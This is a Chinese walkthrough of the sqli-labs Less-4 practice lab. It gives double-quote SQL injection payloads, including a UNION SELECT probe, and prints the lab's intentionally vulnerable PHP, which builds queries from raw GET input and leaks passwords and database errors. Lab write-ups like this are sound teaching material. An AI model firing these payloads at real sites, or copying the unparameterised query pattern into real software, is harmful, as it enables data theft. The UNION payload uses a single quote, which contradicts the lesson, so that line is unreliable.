# Less-4 **GET Error Based- DoubleQuotes String**
TAG：GET型注入、字符型注入  
## 漏洞利用
less4和less3相似，只是包裹字符的单引号变成了双引号，可以从报错信息中体现  
payload:```?id=1"```  
![les4_1](images\less4_1.png)  

payload:```?id=1")--+```  
![less4_2](images\less4_2.png)  

获取回显点
payload:```?id=0') union select 1,2,3--+```
![less4_3](images\less4_3.png)  
其余读取数据库信息的语句类似less-3，只不过要将单引号'替换为双引号"  

## 源码分析
### less4源码  
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-4 Error Based- DoubleQuotes String</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 

$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo "<font size='5' color= '#99FF00'>";
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>

</font> </div></br></br></br><center>
<img src="../images/Less-4.jpg" /></center>
</body>
</html>
```  

## 漏洞点分析  
```
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
$result=mysql_query($sql);
```
注意这个less中，参数id被双引号所包裹了  
```$id = '"' . $id . '"';```
相应的恶意语句也要做出调整，使用双引号来进行语句的闭合  